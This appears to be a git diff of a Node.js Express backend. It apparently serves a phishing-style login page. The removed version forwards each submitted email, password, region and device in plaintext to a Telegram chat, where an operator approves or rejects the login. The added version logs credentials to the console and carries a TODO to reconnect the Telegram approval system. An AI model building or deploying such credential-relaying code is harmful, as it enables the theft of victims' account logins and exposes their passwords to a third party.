@@ -1,78 +1,42 @@
-import express from "express";
-import cors from "cors";
-import bodyParser from "body-parser";
-import { Telegraf } from "telegraf";
-import { config } from "dotenv";
-
-config(); // loads .env if you use one
+// server.js
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram Bot Setup
-const BOT_TOKEN = process.env.BOT_TOKEN || "YOUR_BOT_TOKEN";
-const CHAT_ID = process.env.CHAT_ID || "YOUR_CHAT_ID";
-const bot = new Telegraf(BOT_TOKEN);
-
+// Enable CORS for all origins
 app.use(cors());
+
+// Parse JSON bodies
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
 
-// Root route
-app.get("/", (req, res) => {
-  res.send("Backend is running!");
+// Simulate approval system
+app.post('/', async (req, res) => {
+    try {
+        const { email, password, device, region } = req.body;
+        console.log('Login attempt:', { email, password, device, region });
+
+        // TODO: connect your Telegram approval system here
+        // For now, manually decide accept/reject
+        // Example: accept if password is 'test123', otherwise reject
+        const status = password === 'test123' ? 'accept' : 'reject';
+
+        // Respond to frontend
+        res.json({ status });
+    } catch (err) {
+        console.error('Error handling login:', err);
+        res.status(500).json({ status: 'error', message: 'Internal server error' });
+    }
 });
 
-// Route to send login data to Telegram and wait for approval
-app.post("/login-approval", async (req, res) => {
-  const { email, password, region, device } = req.body;
-
-  if (!email || !password) {
-    return res.status(400).json({ status: "error", message: "Missing email or password" });
-  }
-
-  const message = `📥 Login Attempt\n\nEmail: ${email}\nPassword: ${password}\nRegion: ${region}\nDevice: ${device}`;
-  
-  try {
-    // Send message with inline buttons (Approve / Reject)
-    await bot.telegram.sendMessage(CHAT_ID, message, {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve", callback_data: `approve:${email}` },
-            { text: "❌ Reject", callback_data: `reject:${email}` }
-          ]
-        ]
-      }
-    });
-
-    // Respond to frontend that message was sent
-    res.json({ status: "pending" });
-  } catch (err) {
-    console.error("Telegram error:", err);
-    res.status(500).json({ status: "error", message: "Failed to send to Telegram" });
-  }
+// Health check
+app.get('/health', (req, res) => {
+    res.send('Server is running');
 });
-
-// Handle callback queries from Telegram bot
-bot.on("callback_query", async (ctx) => {
-  const data = ctx.callbackQuery.data; // e.g., "approve:test@example.com"
-  const [action, email] = data.split(":");
-
-  console.log(`Login ${action} for ${email}`);
-  
-  // Optionally notify user in Telegram
-  await ctx.answerCbQuery(`Login ${action} for ${email}`);
-});
-
-// Start bot polling
-bot.launch().then(() => console.log("Telegram bot running"));
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
-
-// Graceful shutdown
-process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM"));
